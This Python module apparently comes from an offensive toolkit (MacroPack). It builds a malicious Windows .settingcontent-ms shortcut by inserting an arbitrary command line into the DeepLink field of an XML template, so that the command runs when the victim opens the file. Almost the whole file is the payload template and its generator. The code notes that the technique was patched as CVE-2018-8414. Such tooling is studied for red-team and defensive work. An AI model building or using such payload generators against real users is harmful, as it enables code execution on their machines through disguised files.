#!/usr/bin/env python
# encoding: utf-8

import logging

from common.utils import getParamValue, MPParam
from modules.payload_builder import PayloadBuilder


"""

Inspired by https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
Template from: https://gist.github.com/enigma0x3/b948b81717fd6b72e0a4baca033e07f8

"""


SETTINGS_MS_TEMPLATE = \
r"""<?xml version="1.0" encoding="UTF-8"?>
<PCSettings>
  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
    <ApplicationInformation>
      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
      <DeepLink><<<CMD>>></DeepLink>
      <Icon><<<ICON>>></Icon>
    </ApplicationInformation>
    <SettingIdentity>
      <PageID></PageID>
      <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
    </SettingIdentity>
    <SettingInformation>
      <Description>@shell32.dll,-4161</Description>
      <Keywords>@shell32.dll,-4161</Keywords>
    </SettingInformation>
  </SearchableContent>
</PCSettings>
"""


class SettingsShortcutGenerator(PayloadBuilder):
    """ Module used to generate malicious MS Settings shortcut"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(f" [+] Generating {self.outputFileType} file...")
        paramArray = [MPParam("Command line")]
        self.fillInputParams(paramArray)

        # Fill template
        content = SETTINGS_MS_TEMPLATE
        content = content.replace("<<<CMD>>>", getParamValue(paramArray, "Command line"))
        content = content.replace("<<<ICON>>>", self.mpSession.icon)

        with open(self.outputFilePath, 'w') as f:
            f.writelines(content)
        logging.info(f"   [-] Generated Settings Shortcut file: {self.outputFilePath}")
        logging.info(f"   [-] Test with: Double click on {self.outputFilePath} file.")
        logging.info("   [!] The attack via SettingContent-ms has been patched as CVE-2018-8414. \n       This payload is kept in MacroPack but its useless in offensive security scenario.\n")
        

        
        
        